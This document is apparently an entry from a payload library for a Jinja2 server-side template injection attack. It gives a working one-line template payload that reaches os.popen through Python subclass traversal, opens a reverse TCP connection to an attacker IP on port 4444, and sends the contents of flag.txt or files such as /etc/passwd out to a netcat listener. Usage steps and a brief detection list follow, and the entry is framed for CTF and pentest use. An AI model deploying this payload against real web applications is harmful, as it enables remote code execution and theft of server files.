---
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:39.852981+00:00'
updated_at: '2023-04-10T20:23:43.581514+00:00'
tags:
  - SSTI
  - Jinja2
  - RCE
  - Popen
  - Exfiltration
platforms:
  - Web
  - Python
  - Linux
validated: true
---

# Jinja2-SSTI-Payload-for-Flag-Exfiltration-via-Reverse-Connection

## Code

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

## Description

This payload exploits Jinja2 SSTI to execute a Python one-liner via os.popen that establishes a reverse TCP connection to the attacker's IP and port, redirects I/O streams, and cats the contents of 'flag.txt' (or any target file). The output is read and padded to 417 characters to potentially bypass length-based filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ip | Attacker's IP address for the reverse connection | 192.168.1.100 |
| 4444 | Listening port on attacker's machine | 4444 |
| flag.txt | Target file to read and exfiltrate | /etc/passwd |

## Usage

Start a netcat listener (nc -lvnp 4444) on the attacker machine. Replace 'ip' with your IP and inject the payload into the vulnerable template input. The file contents will appear in the listener session. Adapt the subprocess.call for other commands or files in CTF or pentest scenarios.

## Detection

- Intrusion detection on outbound connections to attacker IPs/ports from web servers.
- File access logs showing reads of sensitive files like flag.txt.
- Response analysis for padded outputs or anomalous string lengths.
- Python process monitoring for socket creations and subprocess calls from web apps.

## Related

- [[procedures/Exploit-Jinja2-SSTI-with-Popen-for-RCE]]
